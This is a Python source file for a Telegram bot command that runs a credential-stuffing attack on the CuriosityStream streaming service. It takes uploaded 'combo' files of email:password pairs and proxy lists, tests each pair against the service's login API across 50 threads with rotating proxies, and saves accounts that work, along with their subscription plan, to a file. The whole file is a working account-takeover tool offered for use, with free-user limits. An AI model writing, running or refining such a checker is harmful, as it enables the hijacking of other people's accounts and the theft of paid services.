"""# This is Under development!
from pyrogram import Client, filters, enums
from pyrogram.types import Message
from random import choice
import concurrent.futures
import requests
import os


@Client.on_message(filters.command('chkcu'))
async def chk_curiosity(bot: Client, cmd: Message):
    global status
    await cmd.reply("Please upload your proxy file.")
    proxy_message = await bot.listen(cmd.chat.id)
    proxy_file = await proxy_message.download()
    await cmd.reply("Please upload your combo file.")
    combo_message = await bot.listen(cmd.chat.id)
    combo_file = await combo_message.download()
    if proxy_file.endswith('.txt') and combo_file.endswith('.txt'):
        with open(combo_file, 'r') as combo:
            file = combo.readlines()
        if len(file) > 500:
            return await cmd.reply_text('Free Users Limit Only 500 At Once')
        else:
            status = await cmd.reply_text('Curiositystream Checking...')
            await main(proxy_file=proxy_file, combos_file=combo_file)
    else:
        os.remove(proxy_file)
        return await cmd.reply_text('Please Input proxy.txt file')


def read_proxies(proxy_file):
    try:
        with open(proxy_file, "r") as proxies:
            return [proxy.strip() for proxy in proxies]
    except FileNotFoundError:
        print(f"Please Put proxy in Proxy.txt file")


def random_proxy(proxies):
    proxy = choice(proxies)
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}


def proxy_request(request_type, url, proxies, **kwargs):
    session = requests.session()
    while True:
        try:
            proxy = random_proxy(proxies)
            r = session.request(request_type, url,
                                proxies=proxy, timeout=5, **kwargs).json()
            break
        except requests.exceptions.RequestException:
            pass
    return r


def checker(combo: str, proxies):
    username, password = combo.split(":")
    url = "https://api.curiositystream.com/v1/login/"
    post_data = {"email": username, "password": password}
    r = proxy_request("post", url, proxies, json=post_data)
    if "status" in r:
        # print(f"Good: {username}:{password} plan={r['message']['plan']}")
        write_file(username, password, r["message"]["plan"])
    else:
        print(f"BAD {username}:{password}")


def write_file(username, password, account_type):
    with open("Curiosity_premium.txt", "a") as data:
        account = data.write(f"{username}:{password} | plan={account_type}\n")
        return account


async def main(combos_file, proxy_file):
    threads = 50
    # combos_file = "combo.txt"
    # proxy_file = "proxy.txt"
    try:
        combos = open(combos_file, "r").read().split()
    except FileNotFoundError:
        print("Combo not found, Create Combo.txt")
    else:
        proxies = read_proxies(proxy_file)
        with concurrent.futures.ThreadPoolExecutor(threads) as executor:
            executor.map(checker, combos, [proxies] * len(combos))
"""